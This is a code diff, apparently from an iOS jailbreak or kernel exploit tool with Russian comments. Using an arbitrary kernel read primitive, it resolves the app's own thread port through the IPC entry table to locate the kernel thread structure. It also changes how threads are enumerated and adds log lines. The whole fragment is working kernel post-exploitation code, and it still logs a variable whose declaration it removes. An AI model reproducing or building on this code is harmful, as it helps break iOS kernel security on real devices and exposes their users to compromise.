@@ -2352,7 +2352,11 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                         uint64_t jop = off_thread_machine_jop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid)) : 0;
                         // 2.0.105: mach_thread_self → isTable → kobject (как IOSurface)
                         {
-                            mach_port_t myPort = mach_thread_self();
+                            // 2.0.107: task_threads() → порты → isTable → thread*
+                            thread_act_array_t threads = NULL;
+                            mach_msg_type_number_t tcount = 0;
+                            kern_return_t tkr = task_threads(mach_task_self(), &threads, &tcount);
+                            kpNote(r, [NSString stringWithFormat:@"  [BOOT] task_threads kr=0x%x count=%u", tkr, tcount]);
                             uint64_t isT = 0;
                             uint64_t prT = [self findSelfProcByPidFast:(uint32_t)getpid() log:nil];
                             uint64_t roT = prT ? kp_untag_ptr(early_kread64(prT + koffsetof(proc, proc_ro))) : 0;
@@ -2363,22 +2367,32 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                          ? kp_untag_ptr(kpSMRDecode(tbT)) : kp_untag_ptr(tbT);
                             kpNote(r, [NSString stringWithFormat:@"  [BOOT] port=0x%x isTable=%#llx", myPort, (unsigned long long)isT]);
                             uint64_t thK = 0;
-                            if (isT) {
-                                uint64_t eVA = isT + (uint64_t)sizeof_ipc_entry * (myPort >> 8);
+                            if (isT && tkr == KERN_SUCCESS && threads && tcount > 0) {
+                                // берём первый thread-порт и резолвим через isTable
+                                mach_port_t tp = threads[0];
+                                uint64_t eVA = isT + (uint64_t)sizeof_ipc_entry * (tp >> 8);
                                 uint64_t ieObj = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
-                                kpNote(r, [NSString stringWithFormat:@"  [BOOT] ie_object=%#llx", (unsigned long long)ieObj]);
+                                kpNote(r, [NSString stringWithFormat:@"  [BOOT] thread port=0x%x ie_object=%#llx", tp, (unsigned long long)ieObj]);
                                 if (kpLooksLikeKernelPointer(ieObj)) {
+                                    // ipc_port → ip_kobject = thread*
                                     for (uint32_t ko = 0x18; ko <= 0x50; ko += 8) {
                                         uint64_t cand = kp_untag_ptr(early_kread64(ieObj + ko));
                                         if (!kpLooksLikeKernelPointer(cand)) continue;
-                                        uint64_t tro = kp_untag_ptr(early_kread64(cand + off_thread_t_tro));
-                                        if (kpLooksLikeKernelPointer(tro)) {
-                                            thK = cand;
-                                            kpNote(r, [NSString stringWithFormat:@"  [BOOT] thread*=%#llx via +x%x", (unsigned long long)cand, ko]);
-                                            break;
+                                        // валидация: в thread* есть наш task
+                                        for (uint32_t o = 0; o < 0x400; o += 8) {
+                                            if (kp_untag_ptr(early_kread64(cand + o)) == tkT) {
+                                                thK = cand;
+                                                kpNote(r, [NSString stringWithFormat:@"  [BOOT] ★ thread*=%#llx via port kobj+%x field+%x (has TASK)",
+                                                          (unsigned long long)cand, ko, o]);
+                                                break;
+                                            }
                                         }
+                                        if (thK) break;
                                     }
                                 }
+                                for (mach_msg_type_number_t i = 0; i < tcount; i++)
+                                    mach_port_deallocate(mach_task_self(), threads[i]);
+                                vm_deallocate(mach_task_self(), (vm_address_t)threads, tcount * sizeof(mach_port_t));
                             }
                             if (thK) {
                                 // 2.0.106: offset-finder — ищем в thread* известные указатели
